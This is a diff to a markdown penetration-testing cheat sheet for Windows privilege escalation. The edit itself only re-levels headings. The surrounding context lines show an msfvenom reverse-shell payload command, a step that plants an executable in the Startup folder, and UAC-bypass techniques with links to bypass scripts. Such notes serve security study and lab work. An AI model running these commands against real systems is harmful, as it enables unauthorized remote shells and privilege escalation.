@@ -41,8 +41,9 @@ schtasks
 ```
 
 ---
+## Privilege Escalation
 
-## Unquoted Service Path
+### Unquoted Service Path
 -> Detection 
 ```
 wmic service get Name,State,PathName | findstr "Program"  
@@ -71,7 +72,7 @@ or
 shutdown /r
 ```
 
-## binPath - Services [PrivEsc]
+### binPath - Services [PrivEsc]
 -> Detection
 ```
 . .\PowerUp.ps1
@@ -100,7 +101,6 @@ sc start <service_name>
 ```
 
 https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  
-
 
 ### SeImpersonatePrivilege
 ```
@@ -143,8 +143,8 @@ move ok.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
 logoff
 ```
 
-## Bypass UAC
-### EventViewer
+### Bypass UAC
+#### EventViewer
 -> Step 1 - Kali
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f exe > ok.exe
@@ -180,7 +180,7 @@ Invoke-EventViewer C:\Windows\tasks\shell2.exe
 ```
 https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1
 
-### FodhelperBypass
+#### FodhelperBypass
 https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1
 
 ### Capturing configuration file credentials
